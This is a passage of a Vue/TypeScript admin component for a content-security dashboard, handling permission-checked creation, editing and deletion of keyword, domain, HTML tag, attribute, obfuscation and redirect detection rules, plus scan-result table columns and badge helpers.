      toastError(`HTML Tag Rule #${id} could not be resolved.`);
      htmlTagModalState.closeModal({ replace: true });
    }
  }
});

watch(() => htmlTagModalState.activeEntity.value, (newEntity) => {
  if (newEntity && rulesSubTab.value === 'html') {
    selectedHtmlTagRule.value = newEntity;
    if (htmlTagModalState.isEdit.value) {
      if (!canEditHtmlTagRule.value) {
        toastError('You do not have permission to edit HTML tag rules.');
        htmlTagModalState.closeModal({ replace: true });
        return;
      }
      editingHtmlTagRuleId.value = newEntity.id;
      htmlTagEditForm.value = {
        tag: newEntity.tag || newEntity.pattern || '',
        category: newEntity.category || 'DANGEROUS_TAGS',
        severity: newEntity.severity || 'CRITICAL',
        is_enabled: newEntity.is_enabled ?? true,
        description: newEntity.description || ''
      };
      originalHtmlTagRuleData.value = {
        tag: newEntity.tag || newEntity.pattern || '',
        category: newEntity.category || 'DANGEROUS_TAGS',
        severity: newEntity.severity || 'CRITICAL',
        is_enabled: newEntity.is_enabled ?? true,
        description: newEntity.description || ''
      };
    }
    if (htmlTagModalState.isDelete.value) {
      if (!canDeleteHtmlTagRule.value) {
        toastError('You do not have permission to delete HTML tag rules.');
        htmlTagModalState.closeModal({ replace: true });
        return;
      }
      if (!deletingHtmlTagRule.value) {
        deletingHtmlTagRule.value = {
          id: newEntity.id,
          tag: newEntity.tag || newEntity.pattern || `Rule #${newEntity.id}`
        };
      }
    }
  }
}, { immediate: true });

watch(() => htmlTagModalState.isView.value, (isView) => {
  if (!isView && !htmlTagModalState.isEdit.value && !htmlTagModalState.isDelete.value) {
    selectedHtmlTagRule.value = null;
  }
}, { immediate: true });

watch(() => htmlTagModalState.isEdit.value, (isEdit) => {
  if (!isEdit) {
    editingHtmlTagRuleId.value = null;
    originalHtmlTagRuleData.value = null;
  }
}, { immediate: true });

watch(() => htmlTagModalState.isDelete.value, (isDelete) => {
  if (!isDelete) {
    deletingHtmlTagRule.value = null;
  } else if (!canDeleteHtmlTagRule.value) {
    toastError('You do not have permission to delete HTML tag rules.');
    htmlTagModalState.closeModal({ replace: true });
  }
}, { immediate: true });

const openHtmlTagViewModal = (id: number | string) => {
  if (!canViewHtmlTagRules.value) {
    toastError('You do not have permission to view HTML tag rules.');
    return;
  }
  htmlTagModalState.openView(id);
};

const closeHtmlTagViewModal = () => {
  htmlTagModalState.closeModal();
};

const openEditHtmlTagRuleModal = async (id: number | string) => {
  if (!canEditHtmlTagRule.value) {
    toastError('You do not have permission to edit HTML tag rules.');
    return;
  }
  await htmlTagModalState.openEdit(id);
};

const closeHtmlTagEditModal = async () => {
  await htmlTagModalState.closeModal();
};

const submitUpdateHtmlTagRule = async () => {
  if (!canEditHtmlTagRule.value) {
    toastError('You do not have permission to edit HTML tag rules.');
    return;
  }
  if (!editingHtmlTagRuleId.value) {
    toastError('HTML tag rule identifier missing.');
    return;
  }
  const trimmedTag = htmlTagEditForm.value.tag.trim();
  if (!trimmedTag) {
    toastError('Tag / pattern is required.');
    return;
  }

  const payload: UpdateHtmlTagRulePayload = {};
  const orig = originalHtmlTagRuleData.value;
  const current = htmlTagEditForm.value;

  if (orig) {
    if (trimmedTag !== orig.tag.trim()) {
      payload.tag = trimmedTag;
    }
    if (current.category !== orig.category) {
      payload.category = current.category;
    }
    if (current.severity !== orig.severity) {
      payload.severity = current.severity;
    }
    if (Boolean(current.is_enabled) !== Boolean(orig.is_enabled)) {
      payload.is_enabled = current.is_enabled;
    }
    const currentDesc = current.description.trim();
    const origDesc = (orig.description || '').trim();
    if (currentDesc !== origDesc) {
      payload.description = currentDesc;
    }
  } else {
    payload.tag = trimmedTag;
    payload.category = current.category;
    payload.severity = current.severity;
    payload.is_enabled = current.is_enabled;
    payload.description = current.description.trim();
  }

  if (Object.keys(payload).length === 0) {
    toastInfo('No changes detected.');
    await closeHtmlTagEditModal();
    return;
  }

  if (isSubmittingHtmlTagEdit.value) return;
  isSubmittingHtmlTagEdit.value = true;

  try {
    const updated = await contentSecurityService.updateHtmlTagRule(editingHtmlTagRuleId.value, payload);
    toastSuccess('HTML tag rule updated successfully.');
    await closeHtmlTagEditModal();
    await fetchHtmlTagRules();
    await fetchDetectionRulesSummary();
    if (selectedHtmlTagRule.value && String(selectedHtmlTagRule.value.id) === String(updated.id)) {
      selectedHtmlTagRule.value = updated;
    }
  } catch (err: any) {
    const msg = extractErrorMessage(err, 'Failed to update HTML tag rule.');
    toastError(msg);
  } finally {
    isSubmittingHtmlTagEdit.value = false;
  }
};

const openDeleteHtmlTagRuleModal = async (rule: { id: number | string; tag?: string; pattern?: string }) => {
  if (!canDeleteHtmlTagRule.value) {
    toastError('You do not have permission to delete HTML tag rules.');
    return;
  }
  deletingHtmlTagRule.value = {
    id: rule.id,
    tag: rule.tag || rule.pattern || `Rule #${rule.id}`
  };
  await htmlTagModalState.openDelete(rule.id);
};

const closeHtmlTagDeleteModal = async () => {
  await htmlTagModalState.closeModal();
};

const executeDeleteHtmlTagRule = async () => {
  if (!canDeleteHtmlTagRule.value) {
    toastError('You do not have permission to delete HTML tag rules.');
    return;
  }

  const targetId = deletingHtmlTagRule.value?.id || htmlTagModalState.activeId.value;
  if (!targetId) {
    toastError('HTML tag rule identifier missing.');
    return;
  }
  if (isDeletingHtmlTagRule.value) return;
  isDeletingHtmlTagRule.value = true;

  try {
    await contentSecurityService.deleteHtmlTagRule(targetId);
    toastSuccess(`HTML tag rule "${deletingHtmlTagRule.value?.tag || `#${targetId}`}" deleted successfully.`);
    await closeHtmlTagDeleteModal();
    await fetchHtmlTagRules();
    await fetchDetectionRulesSummary();

    if (htmlTagRulesData.value.length === 0 && htmlTagPage.value > 1) {
      htmlTagPage.value = Math.max(1, htmlTagPage.value - 1);
      await fetchHtmlTagRules();
    }
  } catch (err: any) {
    const msg = extractErrorMessage(err, 'Failed to delete HTML tag rule.');
    toastError(msg);
  } finally {
    isDeletingHtmlTagRule.value = false;
  }
};

const openEditDomainRuleModal = async (id: number | string) => {
  if (!canEditDomainRule.value) {
    toastError('You do not have permission to edit domain rules.');
    return;
  }
  await domainModalState.openEdit(id);
};

const closeDomainEditModal = async () => {
  await domainModalState.closeModal();
};

const openDeleteDomainRuleModal = async (rule: { id: number; domain?: string }) => {
  if (!canDeleteDomainRule.value) {
    toastError('You do not have permission to delete domain rules.');
    return;
  }
  deletingDomainRule.value = {
    id: rule.id,
    domain: rule.domain || `Rule #${rule.id}`
  };
  await domainModalState.openDelete(rule.id);
};

const closeDomainDeleteModal = async () => {
  await domainModalState.closeModal();
};

const executeDeleteDomainRule = async () => {
  if (!canDeleteDomainRule.value) {
    toastError('You do not have permission to delete domain rules.');
    return;
  }

  const targetId = deletingDomainRule.value?.id || domainModalState.activeId.value;
  if (!targetId) {
    toastError('Domain rule identifier missing.');
    return;
  }

  if (isDeletingDomainRule.value) return;

  isDeletingDomainRule.value = true;
  try {
    await contentSecurityService.deleteDomainRule(targetId);
    toastSuccess(`Domain rule "${deletingDomainRule.value?.domain || `#${targetId}`}" deleted successfully.`);
    await closeDomainDeleteModal();
    await fetchDomainRules();
    await fetchDetectionRulesSummary();

    if (domainRulesData.value.length === 0 && domainPage.value > 1) {
      domainPage.value = Math.max(1, domainPage.value - 1);
      await fetchDomainRules();
    }
  } catch (err: any) {
    const msg = extractErrorMessage(err, 'Failed to delete domain rule.');
    toastError(msg);
  } finally {
    isDeletingDomainRule.value = false;
  }
};

const submitUpdateDomainRule = async () => {
  if (!canEditDomainRule.value) {
    toastError('You do not have permission to edit domain rules.');
    return;
  }

  if (!editingDomainRuleId.value) {
    toastError('Domain rule identifier missing.');
    return;
  }

  const trimmedDomain = domainEditForm.value.domain.trim();
  if (!trimmedDomain) {
    toastError('Domain is required.');
    return;
  }

  const payload: UpdateDomainRulePayload = {};
  const orig = originalDomainRuleData.value;
  const current = domainEditForm.value;

  if (orig) {
    if (trimmedDomain !== orig.domain.trim()) {
      payload.domain = trimmedDomain;
    }
    if (current.category !== orig.category) {
      payload.category = current.category;
    }
    if (current.severity !== orig.severity) {
      payload.severity = current.severity;
    }
    if (current.match_type !== orig.match_type) {
      payload.match_type = current.match_type;
    }
    if (Boolean(current.is_enabled) !== Boolean(orig.is_enabled)) {
      payload.is_enabled = current.is_enabled;
    }
    const currentDesc = current.description.trim();
    const origDesc = (orig.description || '').trim();
    if (currentDesc !== origDesc) {
      payload.description = currentDesc;
    }
  } else {
    payload.domain = trimmedDomain;
    payload.category = current.category;
    payload.severity = current.severity;
    payload.match_type = current.match_type;
    payload.is_enabled = current.is_enabled;
    payload.description = current.description.trim();
  }

  if (Object.keys(payload).length === 0) {
    toastInfo('No changes detected.');
    await closeDomainEditModal();
    return;
  }

  isSubmittingDomainEdit.value = true;
  try {
    const updated = await contentSecurityService.updateDomainRule(editingDomainRuleId.value, payload);
    toastSuccess('Domain rule updated successfully.');
    await closeDomainEditModal();
    await fetchDomainRules();
    await fetchDetectionRulesSummary();

    if (selectedDomainRule.value && String(selectedDomainRule.value.id) === String(updated.id)) {
      selectedDomainRule.value = updated;
    }
  } catch (err: any) {
    const msg = extractErrorMessage(err, 'Failed to update domain rule.');
    toastError(msg);
  } finally {
    isSubmittingDomainEdit.value = false;
  }
};

const openEditKeywordRuleModal = async (id: number | string) => {
  if (!canEditKeywordRule.value) {
    toastError('You do not have permission to edit keyword rules.');
    return;
  }
  await keywordModalState.openEdit(id);
};

const closeKeywordEditModal = async () => {
  await keywordModalState.closeModal();
};

const openDeleteKeywordRuleModal = async (rule: { id: number; keyword?: string }) => {
  if (!canDeleteKeywordRule.value) {
    toastError('You do not have permission to delete keyword rules.');
    return;
  }
  deletingKeywordRule.value = {
    id: rule.id,
    keyword: rule.keyword || `Rule #${rule.id}`
  };
  await keywordModalState.openDelete(rule.id);
};

const closeKeywordDeleteModal = async () => {
  await keywordModalState.closeModal();
};

const executeDeleteKeywordRule = async () => {
  if (!canDeleteKeywordRule.value) {
    toastError('You do not have permission to delete keyword rules.');
    return;
  }

  const targetId = deletingKeywordRule.value?.id || keywordModalState.activeId.value;
  if (!targetId) {
    toastError('Keyword rule identifier missing.');
    return;
  }

  if (isDeletingKeywordRule.value) return;

  isDeletingKeywordRule.value = true;
  try {
    await contentSecurityService.deleteKeywordRule(targetId);
    toastSuccess(`Keyword rule "${deletingKeywordRule.value?.keyword || `#${targetId}`}" deleted successfully.`);
    await closeKeywordDeleteModal();
    await fetchKeywordRules();
    await fetchDetectionRulesSummary();

    if (keywordRulesData.value.length === 0 && keywordPage.value > 1) {
      keywordPage.value = Math.max(1, keywordPage.value - 1);
      await fetchKeywordRules();
    }
  } catch (err: any) {
    const msg = extractErrorMessage(err, 'Failed to delete keyword rule.');
    toastError(msg);
  } finally {
    isDeletingKeywordRule.value = false;
  }
};

const submitUpdateKeywordRule = async () => {
  if (!canEditKeywordRule.value) {
    toastError('You do not have permission to edit keyword rules.');
    return;
  }

  if (!editingKeywordRuleId.value) {
    toastError('Keyword rule identifier missing.');
    return;
  }

  const trimmedKeyword = keywordEditForm.value.keyword.trim();
  if (!trimmedKeyword) {
    toastError('Keyword is required.');
    return;
  }

  const payload: UpdateKeywordRulePayload = {};
  const orig = originalKeywordRuleData.value;
  const current = keywordEditForm.value;

  if (orig) {
    if (trimmedKeyword !== orig.keyword.trim()) {
      payload.keyword = trimmedKeyword;
    }
    if (current.category !== orig.category) {
      payload.category = current.category;
    }
    if (current.severity !== orig.severity) {
      payload.severity = current.severity;
    }
    if (current.match_type !== orig.match_type) {
      payload.match_type = current.match_type;
    }
    if (Boolean(current.is_enabled) !== Boolean(orig.is_enabled)) {
      payload.is_enabled = current.is_enabled;
    }
    const currentDesc = current.description.trim();
    const origDesc = (orig.description || '').trim();
    if (currentDesc !== origDesc) {
      payload.description = currentDesc;
    }
  } else {
    payload.keyword = trimmedKeyword;
    payload.category = current.category;
    payload.severity = current.severity;
    payload.match_type = current.match_type;
    payload.is_enabled = current.is_enabled;
    payload.description = current.description.trim();
  }

  if (Object.keys(payload).length === 0) {
    toastInfo('No changes detected.');
    await closeKeywordEditModal();
    return;
  }

  isSubmittingKeywordEdit.value = true;
  try {
    const updated = await contentSecurityService.updateKeywordRule(editingKeywordRuleId.value, payload);
    toastSuccess('Keyword rule updated successfully.');
    await closeKeywordEditModal();
    await fetchKeywordRules();
    await fetchDetectionRulesSummary();

    if (selectedKeywordRule.value && String(selectedKeywordRule.value.id) === String(updated.id)) {
      selectedKeywordRule.value = updated;
    }
  } catch (err: any) {
    const msg = extractErrorMessage(err, 'Failed to update keyword rule.');
    toastError(msg);
  } finally {
    isSubmittingKeywordEdit.value = false;
  }
};

const formatUserInfo = (userVal: any): string => {
  if (!userVal) return 'N/A';
  if (typeof userVal === 'string') return userVal;
  if (typeof userVal === 'number') return `User #${userVal}`;
  if (typeof userVal === 'object') {
    if (userVal.first_name || userVal.last_name) {
      return `${userVal.first_name || ''} ${userVal.last_name || ''}`.trim();
    }
    if (userVal.username) return userVal.username;
    if (userVal.email) return userVal.email;
    if (userVal.id) return `User #${userVal.id}`;
  }
  return 'N/A';
};

// ==========================================
// Modal State: Add / Edit Rule
// ==========================================
const isRuleModalOpen = ref(false);
const editingRule = ref<DetectionRule | null>(null);
const isSubmittingKeywordRule = ref(false);
const isSubmittingDomainRule = ref(false);
const isSubmittingHiddenContentRule = ref(false);
const isSubmittingObfuscationRule = ref(false);
const isSubmittingRedirectRule = ref(false);
const isSubmittingHtmlAttributeRule = ref(false);
const isSubmittingHtmlTagRule = ref(false);

const keywordCreateForm = ref<{
  keyword: string;
  category: KeywordCategory;
  severity: KeywordSeverity;
  match_type: KeywordMatchType;
  is_enabled: boolean;
  description: string;
}>({
  keyword: '',
  category: 'SPAM',
  severity: 'HIGH',
  match_type: 'WORD',
  is_enabled: true,
  description: ''
});

const domainCreateForm = ref<{
  domain: string;
  category: KeywordCategory;
  severity: KeywordSeverity;
  match_type: DomainMatchType;
  is_enabled: boolean;
  description: string;
}>({
  domain: '',
  category: 'GAMBLING',
  severity: 'HIGH',
  match_type: 'EXACT',
  is_enabled: true,
  description: ''
});

const hiddenContentCreateForm = ref<{
  pattern: string;
  category: KeywordCategory;
  severity: KeywordSeverity;
  is_enabled: boolean;
  description: string;
}>({
  pattern: '',
  category: 'HIDDEN_CONTENT',
  severity: 'HIGH',
  is_enabled: true,
  description: ''
});

const obfuscationCreateForm = ref<{
  pattern: string;
  category: KeywordCategory;
  severity: KeywordSeverity;
  is_enabled: boolean;
  description: string;
}>({
  pattern: '',
  category: 'OBFUSCATION',
  severity: 'HIGH',
  is_enabled: true,
  description: ''
});

const redirectCreateForm = ref<{
  pattern: string;
  category: KeywordCategory;
  severity: KeywordSeverity;
  is_enabled: boolean;
  description: string;
}>({
  pattern: '',
  category: 'REDIRECT',
  severity: 'HIGH',
  is_enabled: true,
  description: ''
});

const htmlAttributeCreateForm = ref<{
  attribute: string;
  category: KeywordCategory;
  severity: KeywordSeverity;
  is_enabled: boolean;
  description: string;
}>({
  attribute: '',
  category: 'INJECTION',
  severity: 'CRITICAL',
  is_enabled: true,
  description: ''
});

const htmlTagCreateForm = ref<{
  tag: string;
  category: KeywordCategory;
  severity: KeywordSeverity;
  is_enabled: boolean;
  description: string;
}>({
  tag: '',
  category: 'DANGEROUS_TAGS',
  severity: 'CRITICAL',
  is_enabled: true,
  description: ''
});

const ruleForm = ref({
  type: 'keyword' as DetectionRule['type'],
  pattern: '',
  category: 'General',
  severity: 'High' as SecuritySeverity,
  description: '',
  enabled: true
});

const openAddRuleModal = (type: DetectionRule['type']) => {
  editingRule.value = null;
  if (type === 'keyword') {
    if (!canAddKeywordRule.value) {
      toastError('You do not have permission to add keyword rules.');
      return;
    }
    keywordCreateForm.value = {
      keyword: '',
      category: 'SPAM',
      severity: 'HIGH',
      match_type: 'WORD',
      is_enabled: true,
      description: ''
    };
  } else if (type === 'domain') {
    if (!canAddDomainRule.value) {
      toastError('You do not have permission to add domain rules.');
      return;
    }
    domainCreateForm.value = {
      domain: '',
      category: 'GAMBLING',
      severity: 'HIGH',
      match_type: 'EXACT',
      is_enabled: true,
      description: ''
    };
  } else if (type === 'hidden_content') {
    if (!canAddHiddenContentRule.value) {
      toastError('You do not have permission to add hidden content rules.');
      return;
    }
    hiddenContentCreateForm.value = {
      pattern: '',
      category: 'HIDDEN_CONTENT',
      severity: 'HIGH',
      is_enabled: true,
      description: ''
    };
  } else if (type === 'obfuscation') {
    if (!canAddObfuscationRule.value) {
      toastError('You do not have permission to add obfuscation rules.');
      return;
    }
    obfuscationCreateForm.value = {
      pattern: '',
      category: 'OBFUSCATION',
      severity: 'HIGH',
      is_enabled: true,
      description: ''
    };
  } else if (type === 'redirect') {
    if (!canAddRedirectRule.value) {
      toastError('You do not have permission to add redirect rules.');
      return;
    }
    redirectCreateForm.value = {
      pattern: '',
      category: 'REDIRECT',
      severity: 'HIGH',
      is_enabled: true,
      description: ''
    };
  } else if (type === 'attribute') {
    if (!canAddHtmlAttributeRule.value) {
      toastError('You do not have permission to add HTML attribute rules.');
      return;
    }
    htmlAttributeCreateForm.value = {
      attribute: '',
      category: 'INJECTION',
      severity: 'CRITICAL',
      is_enabled: true,
      description: ''
    };
  } else if (type === 'html') {
    if (!canAddHtmlTagRule.value) {
      toastError('You do not have permission to add HTML tag rules.');
      return;
    }
    htmlTagCreateForm.value = {
      tag: '',
      category: 'DANGEROUS_TAGS',
      severity: 'CRITICAL',
      is_enabled: true,
      description: ''
    };
  }
  ruleForm.value = {
    type,
    pattern: '',
    category: type === 'keyword' ? 'Spam Blacklist' : type === 'domain' ? 'Malicious Domains' : type === 'hidden_content' ? 'Hidden Content' : type === 'obfuscation' ? 'Obfuscation Rules' : type === 'html' ? 'Disallowed Tags' : type === 'attribute' ? 'Event Handlers' : 'Redirects',
    severity: 'High',
    description: '',
    enabled: true
  };
  isRuleModalOpen.value = true;
};

const openEditRuleModal = (rule: DetectionRule) => {
  editingRule.value = rule;
  ruleForm.value = {
    type: rule.type,
    pattern: rule.pattern,
    category: rule.category,
    severity: rule.severity,
    description: rule.description,
    enabled: rule.enabled
  };
  isRuleModalOpen.value = true;
};

const saveRule = async () => {
  // Handle Real Keyword Rule Creation via API
  if (ruleForm.value.type === 'keyword' && !editingRule.value) {
    if (!canAddKeywordRule.value) {
      toastError('You do not have permission to add keyword rules.');
      return;
    }

    const trimmedKeyword = keywordCreateForm.value.keyword.trim();
    if (!trimmedKeyword) {
      toastError('Keyword is required.');
      return;
    }

    try {
      isSubmittingKeywordRule.value = true;
      const payload: CreateKeywordRulePayload = {
        keyword: trimmedKeyword,
        category: keywordCreateForm.value.category,
        severity: keywordCreateForm.value.severity,
        match_type: keywordCreateForm.value.match_type,
        is_enabled: keywordCreateForm.value.is_enabled,
        ...(keywordCreateForm.value.description?.trim() 
          ? { description: keywordCreateForm.value.description.trim() } 
          : {})
      };

      await contentSecurityService.createKeywordRule(payload);
      toastSuccess('Keyword rule created successfully.');
      isRuleModalOpen.value = false;
      await fetchKeywordRules();
      await fetchDetectionRulesSummary();
    } catch (err: any) {
      toastError(err.message || 'Failed to create keyword rule.');
    } finally {
      isSubmittingKeywordRule.value = false;
    }
    return;
  }

  // Handle Real Domain Rule Creation via API
  if (ruleForm.value.type === 'domain' && !editingRule.value) {
    if (!canAddDomainRule.value) {
      toastError('You do not have permission to add domain rules.');
      return;
    }

    const trimmedDomain = domainCreateForm.value.domain.trim();
    if (!trimmedDomain) {
      toastError('Domain is required.');
      return;
    }

    try {
      isSubmittingDomainRule.value = true;
      const payload: CreateDomainRulePayload = {
        domain: trimmedDomain,
        category: domainCreateForm.value.category,
        severity: domainCreateForm.value.severity,
        match_type: domainCreateForm.value.match_type,
        is_enabled: domainCreateForm.value.is_enabled,
        ...(domainCreateForm.value.description?.trim() 
          ? { description: domainCreateForm.value.description.trim() } 
          : {})
      };

      await contentSecurityService.createDomainRule(payload);
      toastSuccess('Domain rule created successfully.');
      isRuleModalOpen.value = false;
      await fetchDomainRules();
      await fetchDetectionRulesSummary();
    } catch (err: any) {
      toastError(err.message || 'Failed to create domain rule.');
    } finally {
      isSubmittingDomainRule.value = false;
    }
    return;
  }

  // Handle Real Hidden Content Rule Creation via API
  if (ruleForm.value.type === 'hidden_content' && !editingRule.value) {
    if (!canAddHiddenContentRule.value) {
      toastError('You do not have permission to add hidden content rules.');
      return;
    }

    const trimmedPattern = hiddenContentCreateForm.value.pattern.trim();
    if (!trimmedPattern) {
      toastError('CSS declaration / pattern is required.');
      return;
    }

    try {
      isSubmittingHiddenContentRule.value = true;
      const payload: CreateHiddenContentRulePayload = {
        pattern: trimmedPattern,
        category: hiddenContentCreateForm.value.category,
        severity: hiddenContentCreateForm.value.severity,
        is_enabled: hiddenContentCreateForm.value.is_enabled,
        ...(hiddenContentCreateForm.value.description?.trim() 
          ? { description: hiddenContentCreateForm.value.description.trim() } 
          : {})
      };

      await contentSecurityService.createHiddenContentRule(payload);
      toastSuccess('Hidden content rule created successfully.');
      isRuleModalOpen.value = false;
      await fetchHiddenContentRules();
      await fetchDetectionRulesSummary();
    } catch (err: any) {
      toastError(err.message || 'Failed to create hidden content rule.');
    } finally {
      isSubmittingHiddenContentRule.value = false;
    }
    return;
  }

  // Handle Real Obfuscation Rule Creation via API
  if (ruleForm.value.type === 'obfuscation' && !editingRule.value) {
    if (!canAddObfuscationRule.value) {
      toastError('You do not have permission to add obfuscation rules.');
      return;
    }

    const trimmedPattern = obfuscationCreateForm.value.pattern.trim();
    if (!trimmedPattern) {
      toastError('Pattern / regex is required.');
      return;
    }

    try {
      isSubmittingObfuscationRule.value = true;
      const payload: CreateObfuscationRulePayload = {
        pattern: trimmedPattern,
        category: obfuscationCreateForm.value.category,
        severity: obfuscationCreateForm.value.severity,
        is_enabled: obfuscationCreateForm.value.is_enabled,
        ...(obfuscationCreateForm.value.description?.trim() 
          ? { description: obfuscationCreateForm.value.description.trim() } 
          : {})
      };

      await contentSecurityService.createObfuscationRule(payload);
      toastSuccess('Obfuscation rule created successfully.');
      isRuleModalOpen.value = false;
      await fetchObfuscationRules();
      await fetchDetectionRulesSummary();
    } catch (err: any) {
      toastError(err.message || 'Failed to create obfuscation rule.');
    } finally {
      isSubmittingObfuscationRule.value = false;
    }
    return;
  }

  // Handle Real Redirect Rule Creation via API
  if (ruleForm.value.type === 'redirect' && !editingRule.value) {
    if (!canAddRedirectRule.value) {
      toastError('You do not have permission to add redirect rules.');
      return;
    }

    const trimmedPattern = redirectCreateForm.value.pattern.trim();
    if (!trimmedPattern) {
      toastError('Redirect pattern / heuristic is required.');
      return;
    }

    try {
      isSubmittingRedirectRule.value = true;
      const payload: CreateRedirectRulePayload = {
        pattern: trimmedPattern,
        category: redirectCreateForm.value.category,
        severity: redirectCreateForm.value.severity,
        is_enabled: redirectCreateForm.value.is_enabled,
        ...(redirectCreateForm.value.description?.trim() 
          ? { description: redirectCreateForm.value.description.trim() } 
          : {})
      };

      await contentSecurityService.createRedirectRule(payload);
      toastSuccess('Redirect rule created successfully.');
      isRuleModalOpen.value = false;
      await fetchRedirectRules();
      await fetchDetectionRulesSummary();
    } catch (err: any) {
      toastError(err.message || 'Failed to create redirect rule.');
    } finally {
      isSubmittingRedirectRule.value = false;
    }
    return;
  }

  // Handle Real HTML Attribute Rule Creation via API
  if (ruleForm.value.type === 'attribute' && !editingRule.value) {
    if (!canAddHtmlAttributeRule.value) {
      toastError('You do not have permission to add HTML attribute rules.');
      return;
    }

    const trimmedAttribute = htmlAttributeCreateForm.value.attribute.trim();
    if (!trimmedAttribute) {
      toastError('Attribute is required.');
      return;
    }

    try {
      isSubmittingHtmlAttributeRule.value = true;
      const payload: CreateHtmlAttributeRulePayload = {
        attribute: trimmedAttribute,
        category: htmlAttributeCreateForm.value.category,
        severity: htmlAttributeCreateForm.value.severity,
        is_enabled: htmlAttributeCreateForm.value.is_enabled,
        ...(htmlAttributeCreateForm.value.description?.trim() 
          ? { description: htmlAttributeCreateForm.value.description.trim() } 
          : {})
      };

      await contentSecurityService.createHtmlAttributeRule(payload);
      toastSuccess('HTML attribute rule created successfully.');
      isRuleModalOpen.value = false;
      await fetchHtmlAttributeRules();
      await fetchDetectionRulesSummary();
    } catch (err: any) {
      toastError(err.message || 'Failed to create HTML attribute rule.');
    } finally {
      isSubmittingHtmlAttributeRule.value = false;
    }
    return;
  }

  // Handle Real HTML Tag Rule Creation via API
  if (ruleForm.value.type === 'html' && !editingRule.value) {
    if (!canAddHtmlTagRule.value) {
      toastError('You do not have permission to add HTML tag rules.');
      return;
    }

    const trimmedTag = htmlTagCreateForm.value.tag.trim();
    if (!trimmedTag) {
      toastError('Tag is required.');
      return;
    }

    try {
      isSubmittingHtmlTagRule.value = true;
      const payload: CreateHtmlTagRulePayload = {
        tag: trimmedTag,
        category: htmlTagCreateForm.value.category,
        severity: htmlTagCreateForm.value.severity,
        is_enabled: htmlTagCreateForm.value.is_enabled,
        ...(htmlTagCreateForm.value.description?.trim() 
          ? { description: htmlTagCreateForm.value.description.trim() } 
          : {})
      };

      await contentSecurityService.createHtmlTagRule(payload);
      toastSuccess('HTML tag rule created successfully.');
      isRuleModalOpen.value = false;
      await fetchHtmlTagRules();
      await fetchDetectionRulesSummary();
    } catch (err: any) {
      toastError(err.message || 'Failed to create HTML tag rule.');
    } finally {
      isSubmittingHtmlTagRule.value = false;
    }
    return;
  }

  // Non-keyword / non-domain or mock edit behavior
  if (!ruleForm.value.pattern.trim()) {
    toastError('Please enter a valid rule pattern.');
    return;
  }

  if (editingRule.value) {
    editingRule.value.pattern = ruleForm.value.pattern.trim();
    editingRule.value.category = ruleForm.value.category.trim();
    editingRule.value.severity = ruleForm.value.severity;
    editingRule.value.description = ruleForm.value.description.trim();
    editingRule.value.enabled = ruleForm.value.enabled;
    editingRule.value.updatedAt = new Date().toISOString().split('T')[0] || '2026-08-25';
    toastSuccess(`Rule ${editingRule.value.id} updated successfully.`);
  } else {
    const newId = `R-${ruleForm.value.type.substring(0, 2).toUpperCase()}-${Math.floor(10 + Math.random() * 90)}`;
    rules.value.unshift({
      id: newId,
      type: ruleForm.value.type,
      pattern: ruleForm.value.pattern.trim(),
      category: ruleForm.value.category.trim(),
      severity: ruleForm.value.severity,
      description: ruleForm.value.description.trim() || 'Custom administrator detection rule',
      enabled: ruleForm.value.enabled,
      matchCount: 0,
      updatedAt: new Date().toISOString().split('T')[0] || '2026-08-25'
    });
    toastSuccess(`New detection rule ${newId} created successfully.`);
  }

  isRuleModalOpen.value = false;
};

const toggleRuleStatus = (rule: DetectionRule) => {
  rule.enabled = !rule.enabled;
  if (rule.enabled) {
    toastSuccess(`Rule ${rule.id} has been enabled.`);
  } else {
    toastInfo(`Rule ${rule.id} has been disabled.`);
  }
};

const deleteRule = (rule: DetectionRule) => {
  rules.value = rules.value.filter(r => r.id !== rule.id);
  toastSuccess(`Rule ${rule.id} (${rule.pattern}) has been deleted.`);
};

const filteredRules = computed(() => {
  const typeMap: Record<string, DetectionRule['type']> = {
    keywords: 'keyword',
    domains: 'domain',
    html: 'html',
    attributes: 'attribute',
    redirects: 'redirect'
  };
  const targetType = typeMap[rulesSubTab.value];
  return rules.value.filter(r => r.type === targetType);
});

// Table columns for Scan Results
const scanResultColumns: UiTableColumn<ContentScan>[] = [
  { key: 'id', label: 'Scan ID', width: '120px', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 whitespace-nowrap font-mono text-xs font-semibold' },
  { key: 'status', label: 'Status', width: '130px', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 whitespace-nowrap' },
  { key: 'content_type', label: 'Type', width: '110px', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 whitespace-nowrap' },
  { key: 'object_id', label: 'Object ID', width: '110px', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 whitespace-nowrap font-mono text-xs' },
  { key: 'field_name', label: 'Field Name', width: '120px', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 whitespace-nowrap font-mono text-xs' },
  { key: 'risk_score', label: 'Risk Score', width: '120px', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 whitespace-nowrap' },
  { key: 'finding_count', label: 'Findings', width: '100px', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 whitespace-nowrap text-xs font-semibold' },
  { key: 'scanner_version', label: 'Scanner Ver.', width: '110px', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 whitespace-nowrap text-xs text-muted-foreground font-mono' },
  { key: 'scanned_at', label: 'Scanned At', width: '140px', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 whitespace-nowrap text-xs text-muted-foreground' },
  { key: 'actions', label: '', width: '60px', headerClass: 'px-4 py-3', cellClass: 'px-4 py-3 text-right' }
];

// Helper styles for badges
const getStatusBadge = (status: SecurityStatus) => {
  switch (status) {
    case 'Critical': return { variant: 'error' as const, label: 'Critical', icon: AlertOctagon };
    case 'High Risk': return { variant: 'error' as const, label: 'High Risk', icon: AlertTriangle };
    case 'Needs Review': return { variant: 'warning' as const, label: 'Needs Review', icon: Info };
    case 'Clean': return { variant: 'success' as const, label: 'Clean', icon: CheckCircle2 };
    case 'Resolved': return { variant: 'info' as const, label: 'Resolved', icon: Check };
    default: return { variant: 'secondary' as const, label: status, icon: Info };
  }
};

const getSeverityBadge = (severity: string) => {
  const val = severity?.toUpperCase();
  switch (val) {
    case 'CRITICAL': return 'bg-rose-500/10 text-rose-600 dark:text-rose-400 border-rose-500/30';
    case 'HIGH': return 'bg-amber-500/10 text-amber-600 dark:text-amber-400 border-amber-500/30';
